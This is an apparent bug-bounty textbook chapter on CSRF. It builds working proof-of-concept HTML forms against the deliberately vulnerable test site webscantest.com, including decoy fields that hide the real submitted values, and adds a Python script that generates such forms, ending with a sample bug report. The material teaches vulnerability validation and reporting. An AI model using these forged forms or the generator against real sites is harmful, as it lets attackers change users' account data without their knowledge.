<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">CSRF and Insecure Session Authentication</h1>
                </header>
            
            <article>
                
<p class="mce-root"><strong>Cross-Site Request Forgery </strong>(<strong>CSRF</strong>) is when an attacker takes advantage of a logged-in user's authenticated state to execute malicious application requests and change the user's app in harmful ways. Because the attacker can't see the result of any attack, it's usually less about exfiltrating information and more about exploiting the app's capabilities (for example, making the user of a mobile payment system send money to the wrong person). There's often a strong social engineering aspect involved: phishing and other techniques are used to get a user to click on the link that will kick off a malicious request and act as the CSRF attack vector.</p>
<p class="mce-root">CSRF is often possible because authentication credentials or cookies meant for one part of an application mistakenly allow access to another. An example would be that while you're logged into PayPal or another payment app, you click on a link sent to you in a chat session. The link executes code that takes the authentication cookie you have in your browser to make an (authenticated) request sending money to the attacker. Unlike XSS, the danger isn't that you'll send sensitive information to the attacker, allowing them to impersonate or defraud you later;<span> </span>instead, the danger is a direct consequence of the actions you're allowed to take as a logged-in user of the app.</p>
<p class="mce-root"/>
<p class="mce-root"/>
<p class="mce-root">Many frameworks (Spring, Joomla, and Django) have their own solutions for preventing CSRF, which usually consist of tying a cookie's authentication ability to a specific in-app action. But, despite CSRF's status as a solved problem, it persists as a recurring bug in the annual OWASP Top-10 surveys. Like SQLi, CSRF is a simple-but-damaging vulnerability that endures largely because of the tension in software development between security and productivity.</p>
<p class="mce-root"><span>The following topics will be covered in this chapter:</span></p>
<ul>
<li class="mce-root"><span>Mechanics of CSRF</span></li>
<li class="mce-root"><span>Tools to use for finding and validating CSRF vulnerabilities</span></li>
<li class="mce-root">Discovering, validating, and reporting on CSRF vulnerabilities</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Technical Requirements</h1>
                </header>
            
            <article>
                
<p>For this chapter, we'll be using Burp Suite and—for our everyday web browsing and proxy—Chrome (<kbd>66.0.3359.139</kbd>). We'll once again be employing Python 3.6.5 and the standard macOS version of shell (<kbd>sh</kbd>) for scripting.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Building and Using CSRF PoCs</h1>
                </header>
            
            <article>
                
<p>A CSRF proof of concept is just a short HTML snippet that, when executed by a user, will take advantage of the weak CSRF defence and change the application state in unexpected or unwanted ways, validating the vulnerability.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Creating a CSRF PoC Code Snippet</h1>
                </header>
            
            <article>
                
<p>As the basis for building a CSRF PoC snippet, let's go back to a form on the deliberately-vulnerable web app, <kbd>webscantest.com</kbd>, that's vulnerable to both XSS and CSRF:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/f06d3b4b-5385-4cee-8b16-efb698a731f0.png"/></div>
<p>Now we can fill in the values for our form, entering the information for one <kbd>William</kbd> <kbd>Private Mandella</kbd> <kbd>Mandella</kbd>:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/89b33017-93ea-44cb-8fca-1dea49657bb0.png"/></div>
<p>In order to build our CSRF PoC, it can be helpful to see the form as an HTTP action, so we can grab the type of data-encoding, HTTP verb, and form-field information all at once.</p>
<p>In order to view that request, make sure you're viewing the page in a browser connected to your Burp Proxy and then turn the intercept feature on from within the <span class="packt_screen">Proxy</span> tab. Clicking <span class="packt_screen">Submit</span>, you should see the form hang as the Burp Proxy intercepts (and holds onto) the form's HTTP <kbd>POST</kbd> request:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/d84b9b57-a399-459d-9a9d-95b15028e072.png"/></div>
<p>From this, we can deduce all the necessary parts of our CSRF PoC. Let's take a look at the code and then break down the rationale behind each tag and attribute:</p>
<pre>&lt;html&gt;<br/>    &lt;form enctype="application/x-www-form-urlencoded" method="POST" action="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>        &lt;label&gt;fname&lt;/label&gt;&lt;input type="text" value="William" name="fname"&gt;<br/>        &lt;label&gt;nick&lt;/label&gt;&lt;input type="text" value="Private Mandella" name="nick"&gt;<br/>        &lt;label&gt;lname&lt;/label&gt;&lt;input type="text" value="Mandella" name="lname"&gt;<br/>        &lt;label&gt;submit&lt;/label&gt;&lt;input type="text" value="submit" name="submit"&gt;<br/>        &lt;input type="submit" value="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>    &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>You can see the form's <kbd>enctype</kbd> attribute is pulled directly from the intercepted request—<kbd>method</kbd> and the URL value for the <kbd>action</kbd> attributes too. In fact, this entire snippet is simply a reverse-engineered expression of the submission in HTML. We know what HTTP request the form created <span>–</span> now we've written the code to produce that behavior.</p>
<p>This code imitates the form on the original <kbd>webscantest.com</kbd> page. But in the case of a real, malicious CSRF attack, the attacker probably wouldn't want to just trigger an exact duplicate of an ordinary request the user had already made. More likely, they'd alter it for their own purposes <span>– </span>switching financial routing numbers, changing account passwords, or altering some other piece of critical information.</p>
<p>In this case, the form fields might not be as ripe for exploitation, but the principal holds for more dangerous situations.</p>
<p>Let's still have a little fun by promoting <kbd>Private Mandella</kbd> to his rightful rank of major. Here's the altered code:</p>
<pre>&lt;html&gt;<br/>    &lt;form enctype="application/x-www-form-urlencoded" method="POST" action="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>        &lt;label&gt;fname&lt;/label&gt;&lt;input type="text" value="William" name="fname"&gt;<br/>        &lt;label&gt;nick&lt;/label&gt;&lt;input type="text" value="Major Mandella" name="nick"&gt;<br/>        &lt;label&gt;lname&lt;/label&gt;&lt;input type="text" value="Mandella" name="lname"&gt;<br/>        &lt;label&gt;submit&lt;/label&gt;&lt;input type="text" value="submit" name="submit"&gt;<br/>        &lt;input type="submit" value="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>    &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p class="mce-root"/>
<p>But if the intent is to deceive the target of the CSRF attack into doing what we want <span>–</span> unwittingly changing Mandella's rank <span>–</span> why are we showing them? Why offer the user a chance to see or manipulate the <kbd>nick</kbd> input field at all? See the following:</p>
<pre>&lt;html&gt;<br/>    &lt;form enctype="application/x-www-form-urlencoded" method="POST" action="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>        &lt;label&gt;fname&lt;/label&gt;&lt;input type="text" value="William" name="fname"&gt;<br/>        &lt;label&gt;nick&lt;/label&gt;&lt;input type="text" value="Private Mandella" name="other-nick"&gt;<br/>        &lt;label&gt;lname&lt;/label&gt;&lt;input type="text" value="Mandella" name="lname"&gt;<br/>        &lt;label&gt;submit&lt;/label&gt;&lt;input type="text" value="submit" name="submit"&gt;<br/>        &lt;input type="submit" value="http://webscantest.com/crosstraining/aboutyou.php"&gt;<br/>        &lt;input type="hidden" value="Major Mandella" name="nick"&gt;<br/>    &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>In this last snippet, we've changed the name of the <kbd>other-nick</kbd> input field with the <kbd>nick</kbd> label our hapless user is expecting, while making the real <kbd>nick</kbd> input hidden—which contains our secret value, the rank we think the major deserves.</p>
<p>Of course, when you're creating a CSRF PoC as part of a bug-report submission, you want to make sure you're not actually changing or modifying sensitive information (such as a password or transaction amount), though it can be useful to make a small alteration in order to illustrate the possible impact of the bug.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Validating Your CSRF PoC</h1>
                </header>
            
            <article>
                
<p>Now that we've created a basic CSRF PoC, we can go about applying it to prove the presence of a CSRF vulnerability.</p>
<p class="mce-root"/>
<p>Using our PoC snippet is extremely simple. We just open it as a local file in our browser and submit the form we've coded:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/93b3182f-9213-49de-979f-b279b1a9f2f6.png"/></div>
<p>Here's what our PoC looks like opened in Chrome. There's no CSS making it pretty <span>–</span> our HTML snippet is as bare bones as it gets <span>–</span> but in the case of a CSRF vulnerability being exploited in the wild, most of the fields would probably be hidden anyway, with either a fake form to get the user to make the submission, or a way of automatically submitting the form on page load. Note that in the <kbd>nick</kbd> field, we have <kbd>Private Mandella</kbd><span>—</span>our decoy data in action.</p>
<p class="mce-root"/>
<p>Let's submit the form to see whether we can successfully forge the cross-site request:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/d150e526-88ae-462c-abf7-4f067e38dd04.png"/></div>
<p>Request forged! We've been redirected to a success screen indicating the <kbd>POST</kbd> request generated from our local form has been accepted! Also, critically, we can see our hidden field containing the real value for the <kbd>nick</kbd> input tag was the value accepted as formerly Private, which is now Major Mandella's nick.</p>
<p>This example might still seem fairly innocuous <span>–</span> messing with part of a username <span>–</span> but the ability to change a user's application state by altering their form data is serious. Even altering a username can actually be a clever way of stealing an account <span>–</span> if the affected application didn't allow password retrieval using only an account-linked email, the victim of the attack might not be able to resolve their authentication problems.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Creating Your CSRF PoC Programmatically</h1>
                </header>
            
            <article>
                
<p>Rather than manually constructing a PoC just by eyeballing the intercepted HTTP request in our Burp proxy tab, it would be awfully nice if we had a script that could take the information we need as a series of input (from either a CLI argument, a web scraper, or another source).</p>
<p>Let's do it. With just a little Python, we can make a short script that painlessly formats our info into a CSRF PoC.</p>
<p>Let's start by defining the data we'll need to build the PoC. We'll start defining those variables right after we set up our interpreter in our new <kbd>csrf_poc_generator.py</kbd> file:</p>
<pre>#!/usr/bin/env python3<br/><br/>method="POST"<br/>encoding_type="application/x-www-form-urlencoded"<br/>action="http://webscantest.com/crosstraining/aboutyou.php"<br/>fields = [<br/>    {<br/>        "type":"text",<br/>        "name":"fname",<br/>        "label":"fname"<br/>    },<br/>    {<br/>        "type":"text",<br/>        "name":"lname",<br/>        "label":"lname"<br/>    },<br/>    {<br/>        "type":"text",<br/>        "name":"nick",<br/>        "label":"nick"<br/>    }<br/>]</pre>
<p>This structure <span>–</span> strings for the basic <kbd>form</kbd> tag attributes and a <kbd>fields</kbd> list of dictionaries with all the information we need to build the different form fields <span>–</span> is simple enough as a starting point, while also allowing some basic capabilities. Specifically, the abilities to add an arbitrary amount of form fields and to add new attributes to make new form objects.</p>
<p>Now we just need some logic to take this data and create the necessary HTML markup. Thankfully, the HTML parser we used in <a href="23759e04-8982-41fd-b936-580865a51439.xhtml" target="_blank">Chapter 3</a>, <em><span>Preparing for an Engagement</span></em> to extract the JavaScript from a page we were crawling for vulnerabilities <span>–</span> Beautiful Soup <span>–</span> can also be used to create markup.</p>
<p>For example, here's the code creating our outermost <kbd>html</kbd> tag that will wrap our form:</p>
<pre>from bs4 import BeautifulSoup, Tag<br/><br/>content = BeautifulSoup("&lt;html&gt;&lt;/html&gt;", "html.parser")<br/><br/>print(content.prettify())</pre>
<p class="mce-root"/>
<p>In this case, we're just instantiating the HTML document as a single closed <kbd>html</kbd> tag. To insert a child element, we use this code:</p>
<pre>html_tag = content.find("html")<br/>form_tag = content.new_tag("form")<br/>html_tag.append(form_tag)</pre>
<p>Following each line of the script, we grab a reference to that root <kbd>html</kbd> element, create a new tag for the <kbd>form</kbd> that will be our CSRF PoC, then append that form tag as a child element to its <kbd>html</kbd> parent.</p>
<p>Using the module this way illustrates its advantages over plain string manipulation—we don't have to constantly break up and nest successive elements and the <kbd>append()</kbd> syntax also makes it easier to loop through and nest multiple children (which will come in handy).<br/>
<br/>
With that structure in mind, we need to build the markup for the last (and most important) part of the PoC—the form fields. We'll leverage the fact that we can nest multiple children in a loop and that we have our form field data stored in an enumerable:</p>
<pre>for field in fields:<br/>    field_tag = content.new_tag("input")<br/>    form_tag.append(field_tag)</pre>
<p>This code gives us the right number of input, but of course we still need logic to add <kbd>type</kbd>, <kbd>name</kbd>, and other attributes. Note that, since we don't need to latter retrieve the variable references for the tags we're creating, we can go ahead and overwrite them with each iteration:</p>
<pre>for field in fields:<br/>    field_tag = content.new_tag("input", type=field['type'])<br/>    field_tag['name'] = field['name']<br/>    form_tag.append(field_tag)</pre>
<p>You might be wondering: why not just add another argument to the <kbd>new_tag()</kbd> call in order to address the input's <kbd>name</kbd> and <kbd>type</kbd> in a single line?</p>
<p>The <kbd>field_tag['name'] = field['name']</kbd> line is an admittedly inelegant solution to the fact that <kbd>name</kbd> is a reserved keyword in Beautiful Soup. That means we need to use a part of the API that lets us define the attribute using a string, which this method does. Our final addition to complete the basic structure of the form is a submit <kbd>input</kbd> field. We can achieve that in two lines:</p>
<pre>submit_tag = content.new_tag("input", type="submit", value="submit")<br/>form_tag.append(submit_tag)</pre>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Here's the result of those additional changes:</p>
<pre>&lt;html&gt;<br/> &lt;form&gt;<br/>  &lt;input name="fname" type="text"/&gt;<br/>  &lt;input name="lname" type="text"/&gt;<br/>  &lt;input name="nick" type="text"/&gt;<br/>  &lt;input type="submit" value="submit"/&gt;<br/> &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>To take this further, we need to extend our use of attributes, and finally use the other variables (such as <kbd>action</kbd> and <kbd>method</kbd>) we defined earlier. We can do that while also adding a <kbd>label</kbd> tag for each appropriate <kbd>input</kbd> field.<br/>
<br/>
We can also extend our initial data structure to accompany some changes. Let's say we want to add a <kbd>value</kbd> attribute to each <kbd>input</kbd> (as we have in our other PoC). We can do that simply by adding an extra field in the dictionary for each form field.<br/>
<br/>
Here's what it looks like when we put it all together:</p>
<pre>#!/usr/bin/env python3<br/>from bs4 import BeautifulSoup<br/><br/>def generate_poc():<br/>    method="POST"<br/>    encoding_type="application/x-www-form-urlencoded"<br/>    action="http://webscantest.com/crosstraining/aboutyou.php"<br/>    fields = [<br/>        {<br/>            "type":"text",<br/>            "name":"fname",<br/>            "label":"fname",<br/>            "value":"William"<br/>        },<br/>        {<br/>            "type":"text",<br/>            "name":"lname",<br/>            "label":"lname",<br/>            "value":"Mandella"<br/>        },<br/>        {<br/>            "type":"text",<br/>            "name":"nick",<br/>            "label":"nick",<br/>            "value":"Major Mandella"<br/>        }<br/>    ]<br/><br/>    content = BeautifulSoup("&lt;html&gt;&lt;/html&gt;", "html.parser")<br/>    html_tag = content.find("html")<br/>    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)<br/>    html_tag.append(form_tag)<br/><br/>    for field in fields:<br/>        label_tag = content.new_tag('label')<br/>        label_tag.string = field['label']<br/>        field_tag = content.new_tag("input", type=field['type'], value=field['value'])<br/>        field_tag['name'] = field['name']<br/>        form_tag.append(label_tag)<br/>        form_tag.append(field_tag)<br/><br/>    submit_tag = content.new_tag("input", type="submit", value=action)<br/>    form_tag.append(submit_tag)<br/><br/>    return content.prettify()<br/><br/>if __name__ == "__main__":<br/>    print(generate_poc())</pre>
<p>If you're familiar with Python, you'll notice the logic is wrapped in a function and then bootstrapped in the <kbd>if __name__ == "__main__"</kbd>  conditional so that we get the expected behavior when we run the script from the command line (the HTML is printed to <kbd>STDOUT</kbd>). At the same time, we can build other Python modules that import the <kbd>generate_poc()</kbd> function without side-effects.<br/>
<br/>
All of this generates the following markup:</p>
<pre>&lt;html&gt;<br/> &lt;form action="http://webscantest.com/crosstraining/aboutyou.php" enctype="application/x-www-form-urlencoded" method="POST"&gt;<br/>  &lt;label&gt;fname&lt;/label&gt;&lt;input name="fname" type="text" value="William"/&gt;<br/>  &lt;label&gt;lname&lt;/label&gt;&lt;input name="lname" type="text" value="Mandella"/&gt;<br/>  &lt;label&gt;nick&lt;/label&gt;&lt;input name="nick" type="text" value="Major Mandella"/&gt;<br/>  &lt;input type="submit" value="http://webscantest.com/crosstraining/aboutyou.php"/&gt;<br/> &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>It looks pretty much like the code we initially wrote from eyeballing the intercepted Burp request.</p>
<p>Now to try it out! If we save this file, change Mandella's rank again (making him a <span class="packt_screen">General</span>), and open it in our browser, we can submit it to see whether our foray into meta-programming was a success:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/082c2992-dd79-4b31-8ccb-8449109b5062.png"/></div>
<p>Success! Based on a few simple data points, our code generated the code to prove this vulnerability.</p>
<p>There are many ways to complete this script. As previously mentioned, the initial variables could be populated by command-line arguments, data pulled from a site, or a simple application form. The preceding script is a good starting point for any of those approaches.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">CSRF – An End-to-End Example</h1>
                </header>
            
            <article>
                
<p>Let's take another look at a CSRF vulnerability on <kbd>webscantest.com</kbd>. Here's the form we'll be testing:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/68f5b43b-7d59-4fee-ac76-3d2682f3a18b.png" style=""/></div>
<p>Simple enough. Fire up the Burp proxy and make sure the <span class="packt_screen">Intercept</span> feature is on, let's fill in the form with a nice test value:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/dcaafd6e-2165-4ec4-82e9-2d95682ec700.png" style=""/></div>
<p>As a sidenote, Cyan is really cool <span>–</span> in the subtractive color system, Cyan is a primary color and can be created by removing red from white light. Let's submit this form and then check back with Burp to see the intercepted request:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/7bdcadc4-9b31-4fe3-b72b-69a2d889c00e.png" style=""/></div>
<p>OK, noting the important information <span>–</span> the HTTP request method, the form encoding, the field data, and so on <span>–</span> let's take a look at what happens when we turn <span class="packt_screen">Intercept</span> off and allow the <kbd>POST</kbd> request to resolve:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/4bdd4353-82f1-497e-8c2b-8d862e3751ab.png" style=""/></div>
<p>Here's what a successful submission looks like. Critically for us, we can see what value the form submitted through the success message.</p>
<p>Let's feed this information into our <kbd>csrf_poc_generator.py</kbd> script, making a few small changes where our important variables are declared so that we can pass them as command-line arguments. With those changes, here's the new version of the top part of our script <span>–</span> notice the new <kbd>sys</kbd> and <kbd>ast</kbd> packages, and how we're using <kbd>ast</kbd> to parse a text representation of a Python list into the actual data structure:</p>
<pre>#!/usr/bin/env python3<br/>import sys<br/>import ast<br/><br/>from bs4 import BeautifulSoup, Tag<br/><br/>def generate_poc():<br/>    method=sys.argv[1]<br/>    encoding_type=sys.argv[2]<br/>    action=sys.argv[3]<br/>    fields = ast.literal_eval(sys.argv[4])</pre>
<p class="mce-root"/>
<p>The rest of our script is exactly the same. Now we can pass our critical information from the command line. Passing the field information right now is a little ungainly, but in the future, we could have it read from a generated JSON file or other data source (such as a web scraper). Here's what our one-liner currently looks like:</p>
<pre>python code/csrf_poc_generator.py "POST" "application/x-www-form-urlencoded" "http://webscantest.com/csrf/csrfpost.php" "[{ 'type':'text', 'name':'property', 'label':'color', 'value':''}]"</pre>
<p>And this is what the PoC it outputs looks like:</p>
<pre>&lt;html&gt;<br/> &lt;form action="http://webscantest.com/csrf/csrfpost.php" enctype="application/x-www-form-urlencoded" method="POST"&gt;<br/>  &lt;label&gt;<br/>   color<br/>  &lt;/label&gt;<br/>  &lt;input name="property" type="text" value=""/&gt;<br/>  &lt;input type="submit" value="http://webscantest.com/csrf/csrfpost.php"/&gt;<br/> &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>Here's what it looks like when we open it in Chrome:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/f54a1333-3434-4c1c-9688-155dce4da3e5.png"/></div>
<p class="mce-root"/>
<p>Strictly speaking, this CSRF PoC does what we need it to: it illustrates that we can forge form requests that originate from our own sources. But to make it just a tiny bit more black hat (and show the bounty program a hint of how the vulnerability could be exploited), let's add some hidden-field chicanery.</p>
<p>Here's what our snippet looks like as it changes the visible form field to a dummy value and creates a second hidden field that contains our actual payload:</p>
<pre>&lt;html&gt;<br/> &lt;form action="http://webscantest.com/csrf/csrfpost.php" enctype="application/x-www-form-urlencoded" method="POST"&gt;<br/>  &lt;label&gt;<br/>   color<br/>  &lt;/label&gt;<br/>  &lt;input name="dummy-property" type="text" value=""/&gt;<br/>  &lt;input name="property" type="hidden" value="Peasoup"&gt;<br/>  &lt;input type="submit" value="http://webscantest.com/csrf/csrfpost.php"/&gt;<br/> &lt;/form&gt;<br/>&lt;/html&gt;</pre>
<p>You can see in the malicious part <span>–</span> where we're populating the property the web app will actually consume <span>–</span> that we're submitting Peasoup as the user's favorite color. The depths of our depravity know no bounds.</p>
<p><span>Pretending to be a hapless user, when we open our snippet in the browser, we don't see any red flags (on the surface). If we opened our <kbd>dev</kbd> tools and started inspecting the hidden field element, it would be a different story:</span></p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/cddb7a90-63f4-4858-8c9a-28ab9b88fe00.png"/></div>
<p>Let's go ahead and submit the form using our true favorite color: the visually beautiful and scientifically curious Cyan. What will the PoC return us? See the following:</p>
<div class="CDPAlignCenter CDPAlign"><img src="assets/fed35a19-6a69-4b5b-9328-78aa0fcb34f1.png"/></div>
<p class="mce-root"/>
<p>Peasoup <span>–</span> the ugliest and most cursed of colors. But more importantly for us, the success message shows our PoC has proved what it set out to do. After we do one more refactoring pass <span>–</span> putting the command-line argument parsing in the <kbd>if __name__ == "__main__":</kbd> bootstrapping conditional, where it belongs <span>–</span> and adding a PEP8-compatible function docstring, this is what our <kbd>csrf_poc_generator.py</kbd> looks like:</p>
<pre>#!/usr/bin/env python3<br/>import sys<br/>import ast<br/><br/>from bs4 import BeautifulSoup, Tag<br/><br/>def generate_poc(method, encoding_type, action, fields):<br/>    """ Generate a CSRF PoC using basic form data """<br/>    content = BeautifulSoup("&lt;html&gt;&lt;/html&gt;", "html.parser")<br/>    html_tag = content.find("html")<br/>    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)<br/>    html_tag.append(form_tag)<br/><br/>    for field in fields:<br/>        label_tag = content.new_tag('label')<br/>        label_tag.string = field['label']<br/>        field_tag = content.new_tag("input", type=field['type'], value=field['value'])<br/>        field_tag['name'] = field['name']<br/>        form_tag.append(label_tag)<br/>        form_tag.append(field_tag)<br/><br/>    submit_tag = content.new_tag("input", type="submit", value=action)<br/>    form_tag.append(submit_tag)<br/><br/>    return content.prettify()<br/><br/>if __name__ == "__main__":<br/>    method=sys.argv[1]<br/>    encoding_type=sys.argv[2]<br/>    action=sys.argv[3]<br/>    fields = ast.literal_eval(sys.argv[4])<br/>    print(generate_poc(method, encoding_type, action, fields))</pre>
<p>With our script all cleaned up and the vulnerability successfully proven, now we can write our report.</p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Gathering Report Information</h1>
                </header>
            
            <article>
                
<p>Let's walk through the info we need to write our report.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Category</h1>
                </header>
            
            <article>
                
<p>This is a CSRF <kbd>POST</kbd> method attack.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Timestamps</h1>
                </header>
            
            <article>
                
<p>For our timestamp, we can use an approximate time for when we first submitted our CSRF PoC.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">URL</h1>
                </header>
            
            <article>
                
<p>In our case, the vulnerable URL is simply the target of the <kbd>POST</kbd> action:</p>
<pre><strong>http://webscantest.com/csrf/csrfpost.php</strong></pre>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Payload</h1>
                </header>
            
            <article>
                
<p>For the PoC snippet we evil-ed up, the dastardly data alteration we made was forcing our user to select Peasoup as their favorite color. That's what we'll include as our Payload value.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Methodology</h1>
                </header>
            
            <article>
                
<p>Our PoC was generated programmatically based on information taken from the intercepted form's HTTP request.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Instructions to Reproduce</h1>
                </header>
            
            <article>
                
<p>For our instructions to reproduce, we can simply provide our CSRF PoC and list the very simple manual steps involved in submitting the forged form request.</p>
<p class="mce-root"/>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Attack Scenario</h1>
                </header>
            
            <article>
                
<p>Although the form where we've detected our vulnerability doesn't seem to be that critical (an individual's favorite color is not codeword-clearance-level information), the ability to change an individual's account information through unwanted application state changes is a serious flaw.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Final Report</h1>
                </header>
            
            <article>
                
<p>Let's use this information to format our submission:</p>
<pre>CATEGORY: CSRF POST-based attack<br/><br/>TIME: 2018-07-22 17:27 (17:27) UTC<br/><br/>URL: http://webscantest.com/csrf/csrfpost.php<br/><br/>PAYLOAD: Peasoup<br/><br/>METHODOLOGY: Vulnerability detected with generated CSRF PoC included in reproduction instructions.<br/><br/>INSTRUCTIONS TO REPRODUCE:<br/><br/>1. Open the following CSRF PoC into a browser either locally or through a hosted environment:<br/><br/>&lt;html&gt;<br/> &lt;form action="http://webscantest.com/csrf/csrfpost.php" enctype="application/x-www-form-urlencoded" method="POST"&gt;<br/>  &lt;label&gt;<br/>   color<br/>  &lt;/label&gt;<br/>  &lt;input name="dummy-property" type="text" value=""/&gt;<br/>  &lt;input name="property" type="hidden" value="Peasoup"&gt;<br/>  &lt;input type="submit" value="http://webscantest.com/csrf/csrfpost.php"/&gt;<br/> &lt;/form&gt;<br/>&lt;/html&gt;<br/><br/>2. Submit the form contained in the CSRF PoC.<br/><br/>ATTACK SCENARIO:<br/>In the case of this POST-based CSRF attack, the vulnerability gives the attacker the opportunity to change a piece of the user's account information if they unwittingly submit the attacker's form. Giving a user a Peasoup-colored car instead of a flashy Cyan one would be a breach of the user's trust and a threat to the company's online ordering system and general bottom line.</pre>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>In this chapter, we covered the basics of <strong>Cross-Site Request Forgery</strong> (<strong>CSRF</strong>) as a vulnerability, created and validated a CSRF PoC, created a CSRF PoC programmatically, and successfully documented the vulnerability for a bug-report submission. Hopefully, you've also come away with a sense of why the bug can be so severe, and a few attack scenarios you can use for a future impact report.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Questions</h1>
                </header>
            
            <article>
                
<ol>
<li>What is CSRF?</li>
<li>What's one possible attack scenario for a malicious actor who discovers a CSRF vulnerability?</li>
<li>What's the typical structure of a CSRF PoC?</li>
<li>How do you use a CSRF PoC to validate a vulnerability?</li>
<li>What's the advantage of using BeautifulSoup to generate HTML, as opposed to raw string manipulation?</li>
<li>What type of CSRF attack did we engage in for our end-to-end example?</li>
<li>What kind of CSRF markup would a malicious actor use? How would it differ from our PoCs? How would it be similar?</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Further Reading</h1>
                </header>
            
            <article>
                
<p>You can find out more about some of the topics we have discussed in this chapter at:</p>
<ul>
<li><strong>Additional CSRF test vulnerabilities</strong>: <a href="http://webscantest.com/csrf/">http://webscantest.com/csrf/</a></li>
</ul>


            </article>

            
        </section>
    </body></html>